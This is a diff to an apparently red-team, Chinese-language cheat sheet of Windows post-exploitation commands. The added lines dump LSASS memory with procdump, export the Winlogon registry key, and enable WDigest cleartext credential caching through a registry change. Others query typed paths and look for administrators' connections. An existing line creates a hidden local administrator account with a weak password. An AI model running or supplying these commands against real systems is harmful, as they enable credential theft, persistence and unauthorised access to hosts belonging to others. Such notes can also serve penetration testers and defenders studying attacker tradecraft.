@@ -2,6 +2,10 @@
 
 - 出网端口扫描.输出到文件。
 - [后渗透之 windows 中无文件落地执行方法](https://mp.weixin.qq.com/s/-rN-rsnYRSKuJr5BkaRnBg)
+- dump 密码
+  - 任务管理器转储
+  - procdump64.exe -accepteula -ma lsass.exe lsass.dmp
+
 ```sh
 arp -a
 ipconfig /all
@@ -10,10 +14,19 @@ dir /a C:\Users\Administrator\Desktop
 dir /a C:\Users\public\Desktop
 reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
+reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" Winlogon.reg
 dir D:\ /s | findstr /i ora >c:\tmp.txt # 查找ora文件
 dir /s /b *admin*                       # 查找admin相关文件.
-shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add 
+shell net user defaultuser1 123 /add && net localgroup administrators defaultuser1 /add
+# 查询数据库连接IP记录 见 30_mssql_sqlserver.md
+
+netstat -lantp | grep ESTABLISHED # 关注sshd进程，即运维人员公司IP
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # 管理员登录可读明文
 ```
+
+- [查询数据库连接 IP 记录](./30_mssql_sqlserver.md#查询日志访问-ip数据库)
 
 ## web 路径
 
